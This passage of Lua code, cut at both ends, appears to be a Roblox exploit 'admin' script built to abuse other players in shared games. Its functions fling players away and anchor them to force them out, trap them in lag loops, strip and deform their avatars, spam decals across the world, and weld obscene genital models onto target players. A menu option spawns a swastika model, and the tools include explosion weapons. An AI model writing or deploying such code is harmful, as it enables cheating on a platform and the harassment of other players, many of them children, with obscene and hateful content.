		NEW'TextLabel'{Name = v, BackgroundColor3 = C3(255, 255, 255), BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, Y_FUN), Size = UDim2.new(1, -50, 0, 25), Font = 'SourceSansBold', Text = ' ' .. v, TextColor3 = C3(0, 0, 0), TextSize = 24, TextTransparency = 0.25, TextXAlignment = 'Left', Parent = HOLDERS.fun}
		HOLDERS.fun.CanvasSize = HOLDERS.fun.CanvasSize + UDim2.new(0, 0, 0, 30)
		Y_FUN = Y_FUN + 30
	end
	HOLDERS.fun.CanvasSize = HOLDERS.fun.CanvasSize + UDim2.new(0, 0, 0, 5)
	for i,v in pairs(HOLDERS.fun:GetChildren()) do
		NEW'TextButton'{Name = 'load', BackgroundColor3 = C3(50, 50, 255), BackgroundTransparency = 0.25, BorderSizePixel = 0, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 45, 0, 25), ClipsDescendants = true, Font = 'SourceSansBold', Text = 'load', TextColor3 = C3(255, 255, 255), TextSize = 20, Parent = v}
		v.load.MouseButton1Down:connect(function()
			if v.Name == 'balefire' then LOAD_BALEFIRE()
			elseif v.Name == 'swastika' then local S = OTHER.swastika:Clone() S.Parent = workspace S:MoveTo(LP.Character.Head.Position + Vector3.new(0, 10, 0))
			elseif v.Name == 'trowel' then LOAD_TROWEL()
			elseif v.Name == 'path giver' then LOAD_PATH()
			elseif v.Name == 'orbital strike' then LOAD_STRIKE()
			end
		end)
	end
	
	SETH_MAIN.main.close.MouseButton1Down:connect(function()
		SETH_MAIN:destroy()
	end)
	
	SETH_MAIN.Parent = _CORE
end

LOAD_DATA()

--/ TOOLS

function LOAD_BALEFIRE()
	local HB = Instance.new('HopperBin', LP.Backpack)
	HB.Name = 'balefire'
	
	local function BF(P)
		for i = 1, 50 do
			local E = Instance.new('Explosion', workspace)
			E.BlastRadius = 3
			E.BlastPressure = 999999
			E.Position = LP.Character.Torso.CFrame.p + ((P - LP.Character.Torso.CFrame.p).unit * 6 * i) + ((P - LP.Character.Torso.CFrame.p).unit * 7)
		end
	end
	
	FIRED = false
	local function FIRE(M)
		if not FIRED then
			FIRED = true
			BF(M.Hit.p)
			wait(0.25)
			FIRED = false
		end
	end
	
	HB.Selected:connect(function(M)
		M.Button1Down:connect(function()
			FIRE(M)
		end)
	end)
end

function LOAD_TROWEL()
	local T = Instance.new('Tool', LP.Backpack) T.Name = 'trowel'
	NEW'Part'{Name = 'Handle', Size = Vector3.new(1, 4.4, 1), Parent = T}
	NEW'SpecialMesh'{MeshId = 'rbxasset://fonts/trowel.mesh', MeshType = 'FileMesh', TextureId = 'rbxasset://textures/TrowelTexture.png', Parent = T.Handle}
	NEW'Sound'{Name = 'build', SoundId = 'rbxasset://sounds//bass.wav', Volume = 1, Parent = T.Handle}
	
	local HEIGHT = 5
	local SPEED = 0.05
	local WIDTH = 15
	
	function BRICK(CF, P, C)
		local B = Instance.new('Part')
		B.BrickColor = C
		B.CFrame = CF * CFrame.new(P + B.Size / 2)
		B.Parent = game.Workspace
		B:MakeJoints()
		B.Material = 'Neon'
		return  B, P + B.Size
	end
	
	function BW(CF)
		local BC = BrickColor.Random()
		local B = {}
		assert(WIDTH > 0)
		local Y = 0
		while Y < HEIGHT do
			local P
			local X = -WIDTH / 2
			while X < WIDTH / 2 do
				local brick
				brick, P = BRICK(CF, Vector3.new(X, Y, 0), BC)
				X = P.x
				table.insert(B, brick)
				wait(SPEED)
			end
			Y = P.y
		end
		return B
	end
	
	function S(A)
		if math.abs(A.x) > math.abs(A.z) then
			if A.x > 0 then
				return Vector3.new(1, 0, 0)
			else
				return Vector3.new(-1, 0, 0)
			end
		else
			if A.z > 0 then
				return Vector3.new(0, 0, 1)
			else
				return Vector3.new(0, 0, -1)
			end
		end
	end
	
	T.Enabled = true
	T.Activated:connect(function()
		if T.Enabled and LP.Character:FindFirstChild('Humanoid') then
			T.Enabled = false
			T.Handle.build:Play()
			BW(CFrame.new(LP.Character.Humanoid.TargetPoint, LP.Character.Humanoid.TargetPoint + S((LP.Character.Humanoid.TargetPoint - LP.Character.Head.Position).unit)))
			T.Enabled = true
		end
	end)
end

function LOAD_PATH()
	local HB = Instance.new('HopperBin', LP.Backpack) HB.Name = 'path giver'
	
	local function PATH(M, C)
		if ENABLED and LP.Character then
			if not workspace:FindFirstChild('paths_seth') then Instance.new('Folder', workspace).Name = 'paths_seth' end
			local hit = M.Target
			local point = M.Hit.p
			local P = Instance.new('Part', workspace.paths_seth)
			P.BrickColor = C
			P.Material = 'Neon'
			P.Transparency = 0.75
			P.Anchored = true
			P.Size = Vector3.new(20, 1, 20)
			P.Velocity = M.Hit.lookVector * 75
			P.BottomSurface = 'Smooth'
			P.TopSurface = 'Smooth'
			P.CFrame = CFrame.new(LP.Character.Head.Position)
			P.CFrame = CFrame.new(LP.Character.Torso.Position.x, LP.Character.Torso.Position.y - 4, LP.Character.Torso.Position.z)
			P.CFrame = CFrame.new(P.Position, point)
			wait()
			PATH(M, C)
		end
	end
	
	local function SELECTED(M)
		M.Button1Down:connect(function() ENABLED = true PATH(M, BrickColor.Random()) end)
		M.Button1Up:connect(function() ENABLED = false end)
		M.KeyDown:connect(function(K) if K == 'r' then if workspace:FindFirstChild('paths_seth') then workspace.paths_seth:destroy() end end end)
	end
	
	HB.Selected:connect(SELECTED)
end

function LOAD_STRIKE()
	local HB = Instance.new('HopperBin', LP.Backpack) HB.Name = 'orbital strike'
	
	local function SHOOT(T)
		if ENABLED then
			local P0 = CFrame.new(0, 1500, 0)
			P0 = P0 + ((P0 * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0)).lookVector * 0.5) + (P0 * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0)).lookVector
			local P1 = P0 + ((P0.p - T.Hit.p).unit * -2)
			SATELITE.CFrame = CFrame.new((P0.p + P1.p) / 2, P0.p) * CFrame.fromEulerAnglesXYZ(-math.pi / 2, 0, 0)
			
			local M = Instance.new('Model', workspace)
			NEW'Part'{BrickColor = BrickColor.new('Pink'), Material = 'Neon', CFrame = CFrame.new((SATELITE.CFrame.p + T.Hit.p) / 2, SATELITE.CFrame.p), Anchored = true, CanCollide = false, Size = Vector3.new(1, 1, 1), Parent = M}
			NEW'BlockMesh'{Scale = Vector3.new(1, 1, (SATELITE.CFrame.p - T.Hit.p).magnitude), Parent = M.Part}
			NEW'Explosion'{Position = T.Hit.p, BlastRadius = 20, Parent = workspace}
			
			for i = 1,10 do M.Part.Transparency = 0.5 + (i * 0.05) wait(0.05) end
			M:destroy()
		end
	end
	
	HB.Selected:connect(function(M)
		if not workspace:FindFirstChild('orbital_seth') then
			SATELITE = Instance.new('Part', workspace)
			SATELITE.Name = 'orbital_seth'
			SATELITE.Position = Vector3.new(0, 1500, 0)
			SATELITE.Anchored = true
			SATELITE.CanCollide = false
			SATELITE.Size = Vector3.new(5, 16.8, 5)
			NEW'SpecialMesh'{MeshId = 'rbxassetid://1064328', Scale = Vector3.new(0.2, 0.2, 0.2), Parent = SATELITE}
		end
		M.Button1Down:connect(function() ENABLED = true SHOOT(M) end)
		M.Button1Up:connect(function() ENABLED = false end)
	end)
end

function FIND_IN_TABLE(TABLE, NAME)
	for i,v in pairs(TABLE) do
		if v == NAME then
			return true
		end
	end
	return false
end

function GET_IN_TABLE(TABLE, NAME)
	for i = 1, #TABLE do
		if TABLE[i] == NAME then
			return i
		end
	end
	return false
end

local NOTIFY_1 = false
local NOTIFY_2 = false

function NOTIFY(M, R, G, B)
	spawn(function()
		repeat wait() until not NOTIFY_1
		local NOTIFY_SETH = GUIS.notify_seth:Clone() NOTIFY_SETH.Parent = _CORE
		if NOTIFY_SETH then
			NOTIFY_SETH.notify[''].BackgroundColor3 = C3(R, G, B)
			NOTIFY_SETH.notify.text.Text = ' ' .. M
			repeat wait() until not NOTIFY_1
			NOTIFY_1 = true
			wait(0.5)
			NOTIFY_SETH.notify:TweenPosition(UDim2.new(0, 0, 0.6, 0), 'InOut', 'Quad', 0.4, false) wait(0.5)
			wait(0.5)
			repeat wait() until not NOTIFY_2
			NOTIFY_1 = false
			NOTIFY_SETH.notify:TweenPosition(UDim2.new(0, 0, 0.6, -40), 'InOut', 'Quad', 0.4, false) wait(0.5)
			wait(0.5)
			NOTIFY_2 = true
			wait(2.5)
			NOTIFY_SETH.notify:TweenPosition(UDim2.new(0, -225, 0.6, -40), 'InOut', 'Quad', 0.4, false) wait(0.5)
		end
		wait(1)
		NOTIFY_SETH:destroy()
		NOTIFY_2 = false
	end)
end

function KICK(P)
	spawn(function()
		for i = 1,5 do
			if P.Character and P.Character:FindFirstChild('HumanoidRootPart') and P.Character:FindFirstChild('Torso') then
				P.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(999000, 1001000), 1000000, 1000000)
				local SP = Instance.new('SkateboardPlatform', P.Character) SP.Position = P.Character.HumanoidRootPart.Position SP.Transparency = 1
				spawn(function()
					repeat wait()
						if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then SP.Position = P.Character.HumanoidRootPart.Position end
					until not _PLAYERS:FindFirstChild(P.Name)
				end)
				P.Character.Torso.Anchored = true
			end
		end
	end)
end

_PLAYERS.PlayerRemoving:connect(function(P)
	if FIND_IN_TABLE(KICKS, P) then
		for i,v in pairs(KICKS) do if v == P then table.remove(KICKS, i) end end
		NOTIFY('KICKED ' .. P.Name, 255, 255, 255)
	end
	if FIND_IN_TABLE(JAILED, P.Name) then
		for i,v in pairs(JAILED) do if v == P.Name then table.remove(KICKS, i) end end
	end
end)

function FIX_LIGHTING()
	_LIGHTING.Ambient = C3(0.5, 0.5, 0.5)
	_LIGHTING.Brightness = 1
	_LIGHTING.GlobalShadows = true
	_LIGHTING.Outlines = false
	_LIGHTING.TimeOfDay = 14
	_LIGHTING.FogEnd = 100000
end

function COLOR(PLAYER, BCOLOR)
	for i,v in pairs(PLAYER.Character:GetChildren()) do if v:IsA('Shirt') or v:IsA('Pants') then v:destroy() elseif v:IsA('ShirtGraphic') then v.Archivable = false v.Graphic = '' end end
	for i,v in pairs(PLAYER.Character.Head:GetChildren()) do if v:IsA('Decal') then v:destroy() end end
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			v.BrickColor = BrickColor.new(BCOLOR)
		elseif v:IsA('Accessory') then
			v.Handle.BrickColor = BrickColor.new(BCOLOR)
			for a,b in pairs(v.Handle:GetChildren()) do
				if b:IsA('SpecialMesh') then
					b.TextureId = ''
				end
			end
		end
	end
end

function LAG(PLAYER)
	local POS = CFrame.new(math.random(-100000, 100000), math.random(-100000, 100000), math.random(-100000, 100000))
	spawn(function()
		repeat wait()
			if PLAYER and PLAYER.Character then
				PLAYER.CameraMode = 'LockFirstPerson'
				PLAYER.Character.HumanoidRootPart.CFrame = POS
				PLAYER.Character.Torso.Anchored = true
				Instance.new('ForceField', PLAYER.Character)
				Instance.new('Smoke', PLAYER.Character.Head)
			end
		until not _PLAYERS:FindFirstChild(PLAYER.Name)
	end)
end

local FLYING = false

if LP.Character and LP.Character:FindFirstChild('Humanoid') then
	LP.Character.Humanoid.Died:connect(function() FLYING = false end)
end

function sFLY()
	repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso') and LP.Character:FindFirstChild('Humanoid')
	repeat wait() until MOUSE
	
	local T = LP.Character.Torso
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
				LP.Character.Humanoid.PlatformStand = true
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0.1, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end
	
	MOUSE.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 1
		elseif KEY:lower() == 's' then
			CONTROL.B = -1
		elseif KEY:lower() == 'a' then
			CONTROL.L = -1 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = 1
		end
	end)
	
	MOUSE.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	LP.Character.Humanoid.PlatformStand = false
end

function RESET_MODEL(MODEL)
	for i,v in pairs(MODEL:GetChildren()) do
		if v:IsA('Seat') and v.Name == 'FakeTorso' then
			v:destroy()
		elseif v:IsA('CharacterMesh') or v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Accessory') then
			v:destroy()
		elseif v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			v.Transparency = 0
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	for i,v in pairs(MODEL.Torso:GetChildren()) do
		if v:IsA('SpecialMesh') then
			v:destroy()
		end
	end
	if MODEL.Head:FindFirstChild('Mesh') then
		MODEL.Head.Mesh:destroy()
	end
	if MODEL.Torso:FindFirstChild('Neck') then MODEL.Torso.Neck.C0 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(90), math.rad(180), 0) end
	if MODEL.Torso:FindFirstChild('Left Shoulder') then MODEL.Torso['Left Shoulder'].C0 = CFrame.new(-1, 0.5, 0) * CFrame.Angles(0, math.rad(-90), 0) end
	if MODEL.Torso:FindFirstChild('Right Shoulder') then MODEL.Torso['Right Shoulder'].C0 = CFrame.new(1, 0.5, 0) * CFrame.Angles(0, math.rad(90), 0) end
	if MODEL.Torso:FindFirstChild('Left Hip') then MODEL.Torso['Left Hip'].C0 = CFrame.new(-1, -1, 0) * CFrame.Angles(0, math.rad(-90), 0) end
	if MODEL.Torso:FindFirstChild('Right Hip') then MODEL.Torso['Right Hip'].C0 = CFrame.new(1, -1, 0) * CFrame.Angles(0, math.rad(90), 0) end
end

function UPDATE_MODEL(MODEL, USERNAME)
	local AppModel = _PLAYERS:GetCharacterAppearanceAsync(_PLAYERS:GetUserIdFromNameAsync(USERNAME))
	MODEL.Name = USERNAME
	for i,v in pairs(AppModel:GetChildren()) do
		if v:IsA('SpecialMesh') or v:IsA('BlockMesh') or v:IsA('CylinderMesh') then
			v.Parent = MODEL.Head
		elseif v:IsA('Decal') then
			if MODEL.Head:FindFirstChild('face') then
				MODEL.Head.face.Texture = v.Texture
			else
				local FACE = Instance.new('Decal', MODEL.Head)
				FACE.Texture = v.Texture
			end
		elseif v:IsA('BodyColors') or v:IsA('CharacterMesh') or v:IsA('Shirt') or v:IsA('Pants') or v:IsA('ShirtGraphic') then
			if MODEL:FindFirstChild('Body Colors') then
				MODEL['Body Colors']:destroy()
			end
			v.Parent = MODEL
		elseif v:IsA('Accessory') then
			v.Parent = MODEL
			v.Handle.CFrame = MODEL.Head.CFrame * CFrame.new(0, MODEL.Head.Size.Y / 2, 0) * v.AttachmentPoint:inverse()
		end
	end
	if not MODEL.Head:FindFirstChild('Mesh') then
		local SM = Instance.new('SpecialMesh', MODEL.Head)
		SM.MeshType = Enum.MeshType.Head
		SM.Scale = Vector3.new(1.25, 1.25, 1.25)
	end
end

function CREEPER(PLAYER)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Shirt') or v:IsA('Pants') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Accessory') then
			v:destroy()
		end
	end
	PLAYER.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
	PLAYER.Character.Torso['Right Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
	PLAYER.Character.Torso['Left Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
	PLAYER.Character.Torso['Right Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
	PLAYER.Character.Torso['Left Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			v.BrickColor = BrickColor.new('Bright green')
		end
	end
end

function SHREK(PLAYER)
	COLOR(PLAYER, 'Bright green')
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Accessory') or v:IsA('CharacterMesh') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	for i,v in pairs(PLAYER.Character.Head:GetChildren()) do
		if v:IsA('Decal') or v:IsA('SpecialMesh') then
			v:destroy()
		end
	end
	if PLAYER.Character:FindFirstChild('Shirt Graphic') then
		PLAYER.Character['Shirt Graphic'].Archivable = false
		PLAYER.Character['Shirt Graphic'].Graphic = ''
	end
	local M = Instance.new('SpecialMesh', PLAYER.Character.Head)
	local S = Instance.new('Shirt', PLAYER.Character)
	local P = Instance.new('Pants', PLAYER.Character)
	M.MeshType = 'FileMesh'
	M.MeshId = 'rbxassetid://19999257'
	M.Offset = Vector3.new(-0.1, 0.1, 0)
	M.TextureId = 'rbxassetid://156397869'
	S.ShirtTemplate = 'rbxassetid://133078194'
	P.PantsTemplate = 'rbxassetid://133078204'
end

function DUCK(PLAYER)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Part') and v.Name ~= 'Torso' and v.Name ~= 'HumanoidRootPart' then
			v.Transparency = 1
		elseif v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Accessory') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	local DUCK = Instance.new('SpecialMesh', PLAYER.Character.Torso)
	DUCK.MeshType = 'FileMesh'
	DUCK.MeshId = 'rbxassetid://9419831'
	DUCK.TextureId = 'rbxassetid://9419827'
	DUCK.Scale = Vector3.new(5, 5, 5)
	if PLAYER.Character.Head:FindFirstChild('face') then
		PLAYER.Character.Head.face.Transparency = 1
	end
end

function DOG(PLAYER)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Shirt') or v:IsA('Pants') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		end
	end
	PLAYER.Character.Torso.Transparency = 1
	PLAYER.Character.Torso.Neck.C0 = CFrame.new(0, -0.5, -2) * CFrame.Angles(math.rad(90), math.rad(180), 0)
	PLAYER.Character.Torso['Right Shoulder'].C0 = CFrame.new(0.5, -1.5, -1.5) * CFrame.Angles(0, math.rad(90), 0)
	PLAYER.Character.Torso['Left Shoulder'].C0 = CFrame.new(-0.5, -1.5, -1.5) * CFrame.Angles(0, math.rad(-90), 0)
	PLAYER.Character.Torso['Right Hip'].C0 = CFrame.new(1.5, -1, 1.5) * CFrame.Angles(0, math.rad(90), 0)
	PLAYER.Character.Torso['Left Hip'].C0 = CFrame.new(-1.5, -1, 1.5) * CFrame.Angles(0, math.rad(-90), 0)
	local FakeTorso = Instance.new('Seat', PLAYER.Character)
	local BF = Instance.new('BodyForce', FakeTorso)
	local W = Instance.new('Weld', PLAYER.Character.Torso)
	FakeTorso.Name = 'FakeTorso'
	FakeTorso.TopSurface = 0
	FakeTorso.BottomSurface = 0
	FakeTorso.Size = Vector3.new(3,1,4)
	FakeTorso.BrickColor = BrickColor.new('Brown')
	FakeTorso.CFrame = PLAYER.Character.Torso.CFrame
	BF.Force = Vector3.new(0, FakeTorso:GetMass() * 196.25, 0)
	W.Part0 = PLAYER.Character.Torso
	W.Part1 = FakeTorso
	W.C0 = CFrame.new(0, -0.5, 0)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			v.BrickColor = BrickColor.new('Brown')
		end
	end
end

function ALIEN(PLAYER)
	for i,v in pairs(PLAYER.Character:GetChildren()) do
		if v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Accessory') then
			v:destroy()
		elseif v:IsA('ShirtGraphic') then
			v.Archivable = false
			v.Graphic = ''
		elseif v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
			v.BrickColor = BrickColor.new('Fossil')
		end
	end
	ALIEN_H:Clone().Parent = PLAYER.Character
end

function DECALSPAM(INSTANCE, ID)
	for i,v in pairs(INSTANCE:GetChildren()) do
		if v:IsA('BasePart') then
			spawn(function()
				local FACES = {'Back', 'Bottom', 'Front', 'Left', 'Right', 'Top'}
				local CURRENT_FACE = 1
				for i = 1, 6 do
					local DECAL = Instance.new('Decal', v)
					DECAL.Name = 'decal_seth'
					DECAL.Texture = 'rbxassetid://' .. ID - 1
					DECAL.Face = FACES[CURRENT_FACE]
					CURRENT_FACE = CURRENT_FACE + 1
				end
			end)
		end
		DECALSPAM(v, ID)
	end
end

function UNDECALSPAM(INSTANCE)
	for i,v in pairs(INSTANCE:GetChildren()) do
		if v:IsA('BasePart') then
			for a,b in pairs(v:GetChildren()) do
				if b:IsA('Decal') and b.Name == 'decal_seth' then
					b:destroy()
				end
			end
		end
		UNDECALSPAM(v)
	end
end

function CREATE_DONG(PLAYER, DONG_COLOR)
	if PLAYER.Character:FindFirstChild('DONG') then
		PLAYER.Character.DONG:destroy()
	end
	local D = Instance.new('Model', PLAYER.Character)
	D.Name = 'DONG'
	
	local BG = Instance.new('BodyGyro', PLAYER.Character.Torso)
	local MAIN = Instance.new('Part', PLAYER.Character['DONG'])
	local M1 = Instance.new('CylinderMesh', MAIN)
	local W1 = Instance.new('Weld', PLAYER.Character.Head)
	local P1 = Instance.new('Part', PLAYER.Character['DONG'])
	local M2 = Instance.new('SpecialMesh', P1)
	local W2 = Instance.new('Weld', P1)
	local B1 = Instance.new('Part', PLAYER.Character['DONG'])
	local M3 = Instance.new('SpecialMesh', B1)
	local W3 = Instance.new('Weld', B1)
	local B2 = Instance.new('Part', PLAYER.Character['DONG'])
	local M4 = Instance.new('SpecialMesh', B2)
	local W4 = Instance.new('Weld', B2)
	MAIN.TopSurface = 0 MAIN.BottomSurface = 0 MAIN.Name = 'Main' MAIN.Size = Vector3.new(0.6, 2.5, 0.6) MAIN.BrickColor = BrickColor.new(DONG_COLOR) MAIN.Position = PLAYER.Character.Head.Position MAIN.CanCollide = false
	W1.Part0 = MAIN W1.Part1 = PLAYER.Character.Head W1.C0 = CFrame.new(0, 0.25, 2.1) * CFrame.Angles(math.rad(45), 0, 0)
	P1.Name = 'Mush' P1.BottomSurface = 0 P1.TopSurface = 0 P1.Size = Vector3.new(0.6, 0.6, 0.6) P1.CFrame = CFrame.new(MAIN.Position) P1.BrickColor = BrickColor.new('Pink') P1.CanCollide = false
	M2.MeshType = 'Sphere'
	W2.Part0 = MAIN W2.Part1 = P1 W2.C0 = CFrame.new(0, 1.3, 0)
	B1.Name = 'Left Ball' B1.BottomSurface = 0 B1.TopSurface = 0 B1.CanCollide = false B1.Size = Vector3.new(1, 1, 1) B1.CFrame = CFrame.new(PLAYER.Character['Left Leg'].Position) B1.BrickColor = BrickColor.new(DONG_COLOR)
	M3.Parent = B1 M3.MeshType = 'Sphere'
	W3.Part0 = PLAYER.Character['Left Leg'] W3.Part1 = B1 W3.C0 = CFrame.new(0, 0.5, -0.5)
	B2.Name = 'Right Ball' B2.BottomSurface = 0 B2.CanCollide = false B2.TopSurface = 0 B2.Size = Vector3.new(1, 1, 1) B2.CFrame = CFrame.new(PLAYER.Character['Right Leg'].Position) B2.BrickColor = BrickColor.new(DONG_COLOR)
	M4.MeshType = 'Sphere'
	W4.Part0 = PLAYER.Character['Right Leg'] W4.Part1 = B2 W4.C0 = CFrame.new(0, 0.5, -0.5)
end

function SCALE(C, S)
	if tonumber(S) < 0.5 then S = 0.5 elseif tonumber(S) > 25 then S = 25 end
	
	local HAT_CLONE = {}
	
	for i,v in pairs(C:GetChildren()) do if v:IsA('Accessory') then local HC = v:Clone() table.insert(HAT_CLONE, HC) v:destroy() end end
	
	local HEAD = C.Head
	local TORSO = C.Torso
	local LA = C['Left Arm']
	local RA = C['Right Arm']
	local LL = C['Left Leg']
	local RL = C['Right Leg']
	local HRP = C.HumanoidRootPart
	
	HEAD.Size = Vector3.new(S * 2, S, S)
	TORSO.Size = Vector3.new(S * 2, S * 2, S)
	LA.Size = Vector3.new(S, S * 2, S)
	RA.Size = Vector3.new(S, S * 2, S)
	LL.Size = Vector3.new(S, S * 2, S)
	RL.Size = Vector3.new(S, S * 2, S)
	HRP.Size = Vector3.new(S * 2, S * 2, S)
	
	local M1 = Instance.new('Motor6D', TORSO)
	local M2 = Instance.new('Motor6D', TORSO)
	local M3 = Instance.new('Motor6D', TORSO)
	local M4 = Instance.new('Motor6D', TORSO)
	local M5 = Instance.new('Motor6D', TORSO)
	local M6 = Instance.new('Motor6D', HRP)
	
	M1.Name = 'Neck' M1.Part0 = TORSO M1.Part1 = HEAD M1.C0 = CFrame.new(0, 1 * S, 0) * CFrame.Angles(-1.6, 0, 3.1) M1.C1 = CFrame.new(0, -0.5 * S, 0) * CFrame.Angles(-1.6, 0, 3.1)
	M2.Name = 'Left Shoulder' M2.Part0 = TORSO M2.Part1 = LA M2.C0 = CFrame.new(-1 * S, 0.5 * S, 0) * CFrame.Angles(0, -1.6, 0) M2.C1 = CFrame.new(0.5 * S, 0.5 * S, 0) * CFrame.Angles(0, -1.6, 0)
	M3.Name = 'Right Shoulder' M3.Part0 = TORSO M3.Part1 = RA M3.C0 = CFrame.new(1 * S, 0.5 * S, 0) * CFrame.Angles(0, 1.6, 0) M3.C1 = CFrame.new(-0.5 * S, 0.5 * S, 0) * CFrame.Angles(0, 1.6, 0)
	M4.Name  = 'Left Hip' M4.Part0 = TORSO M4.Part1 = LL M4.C0 = CFrame.new(-1 * S, -1 * S, 0) * CFrame.Angles(0, -1.6, 0) M4.C1 = CFrame.new(-0.5 * S, 1 * S, 0) * CFrame.Angles(0, -1.6, 0)
	M5.Name = 'Right Hip' M5.Part0 = TORSO M5.Part1 = RL M5.C0 = CFrame.new(1 * S, -1 * S, 0) * CFrame.Angles(0, 1.6, 0) M5.C1 = CFrame.new(0.5 * S, 1 * S, 0) * CFrame.Angles(0, 1.6, 0)
	M6.Name = 'RootJoint' M6.Part0 = HRP M6.Part1 = TORSO M6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1) M6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
	
	for i,v in pairs(HAT_CLONE) do v.Parent = C end
end

function CAPE(COLOR)
	if LP.Character:FindFirstChild('Cape') then LP.Character.Cape:destroy() end
	
	repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso')
	
	local T = LP.Character.Torso
	
	local C = Instance.new('Part', T.Parent)
	C.Name = 'cape_seth'
	C.Anchored = false
	C.CanCollide = false
	C.TopSurface = 0
	C.BottomSurface = 0
	C.BrickColor = BrickColor.new(COLOR)
	C.Material = 'Neon'
	C.Size = Vector3.new(0.2, 0.2, 0.2)
	
	local M = Instance.new('BlockMesh', C)
	M.Scale = Vector3.new(9, 17.5, 0.5)
	
	local M1 = Instance.new('Motor', C)
	M1.Part0 = C
	M1.Part1 = T
	M1.MaxVelocity = 1
	M1.C0 = CFrame.new(0, 1.75, 0) * CFrame.Angles(0, math.rad(90), 0)
	M1.C1 = CFrame.new(0, 1, .45) * CFrame.Angles(0, math.rad(90), 0)
	
	local WAVE = false
	
	repeat wait(1 / 44)
		local ANG = 0.2
		local oldMag = T.Velocity.magnitude
		local MV = 0.1
		
		if WAVE then
			ANG = ANG + ((T.Velocity.magnitude / 10) * 0.05) + 1
			WAVE = false
		else
			WAVE = false
		end
		ANG = ANG + math.min(T.Velocity.magnitude / 30, 1)
